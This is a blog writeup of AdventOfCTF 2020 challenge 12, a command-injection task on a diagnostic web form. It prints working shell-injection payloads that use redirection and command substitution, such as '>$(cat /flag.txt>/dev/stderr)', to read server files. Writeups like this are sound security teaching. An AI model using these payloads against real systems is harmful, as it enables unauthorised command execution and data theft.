+++
author = "Maik de Kruif"
title = "Command"
subtitle = "Challenge 12 - AdventOfCTF"
date = 2020-12-14T15:55:21+01:00
description = "A writeup for challenge 12 of AdventOfCTF."
cover = "img/writeups/adventofctf/2020/af3424cd215a6459494ae07eab33cb35.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
    "php",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

- Points: 1200

## Description

To ensure a good Christmas we implemented some diagnostic tools. This one checks that the time to a destination is within an acceptable range. The flag is in /flag.txt.

Visit <https://12.adventofctf.com> to start the challenge.

## Finding the vulnerability

Upon opening the challenge website we're greeted with an input field and a check button. Let's enter some text in the input and press the check button. Initially, nothing happens but after a few seconds we get a result: `1607956922.306628 Destination check was OK`. As the page didn't reload there is probably some javascript in play. Indeed there is, when opening the source, we find a script tag with the following javascript function:

```js
function send() {
  let place = $("#place")[0].value;
  if (place.length > 0) {
    $.post("/", { place: place }, function (data) {
      $("#result")[0].innerHTML = "<b>" + data + "</b>";
    });
  }
  return false;
}
```

If we analyze this function a bit we find that it executes a `POST` request to `/` and puts the result in an HTML element with this selector: `'#result'`.

Let's try some more inputs. Just plain text doesn't seem to change the result much besides the number before "Destination check". If we, however, enter a quote (`"`), we get a different result back:

```text
Something happened: /bin/bash: -c: line 0: unexpected EOF while looking for matching `"'
/bin/bash: -c: line 1: syntax error: unexpected end of file
```

And inputting a backtick (`) returns this error:

```text
Something happened: BusyBox v1.31.1 () multi-call binary.

Usage: nslookup [-type=QUERY_TYPE] [-debug] HOST [DNS_SERVER]

Query DNS about HOST

QUERY_TYPE: soa,ns,a,aaaa,cname,mx,txt,ptr,any
```

### nslookup

I spend quite some time trying to find a way to get out of this command but I could not get anything to work so I took a break.

### Redirection

When I came back, I tried inputting a redirect character (`>`) and it gave a result!

## Getting some output

After entering a redirection character (`>`) we get the following result:

```text
Something happened: /bin/bash: -c: line 0: syntax error near unexpected token `newline'
/bin/bash: -c: line 0: `./check &gt;'
```

This means we can redirect output and thus get arbitrary code execution by putting a sub-command as the output like so:

```bash
> $(ls)
```

But entering this gave an error:

```text
Something happened: /bin/bash: $(ls): ambiguous redirect
```

This means that, while it does work, it does not work directly as the output isn't valid. If we, however, put a sub-command inside a sub-command (`> $($(ls))`), the inner output will be printed:

```text
Something happened: /bin/bash: app.py: command not found
/bin/bash: $($(ls)): ambiguous redirect
```

As we can see, there seems to be an `app.py` file but we don't care about it now. Let's try to cat the flag from the location specified in the challenge description (`/flag.txt`) by entering the following input: `>$($(cat /flag.txt))`. This return the following result:

```text
Something happened: /bin/bash: Congratulations,: command not found
/bin/bash: $($(cat /flag.txt)): ambiguous redirect
```

As we can see, it did read the file. Sadly, however, it only returned the first line...

At this point, I didn't really know what to do but just as I was about to take another break, [@credmp](https://twitter.com/credmp) posted a hint on Twitter. It said the following: "Hint: all error messages are printed on stderr.".

### Redirecting the output

After reading this tweet, I tried the following input: `>$(cat /flag.txt>/dev/stderr)` and it immediately worked! I felt pretty stupid for not having thought about that 😐.

## Solution

So redirecting the output to `stderr` worked and we got the flag: `NOVI{we_are_halfway_to_christmas!}`.

This flag can then be submitted for the [challenge](https://ctfd.adventofctf.com/challenges#12-13).
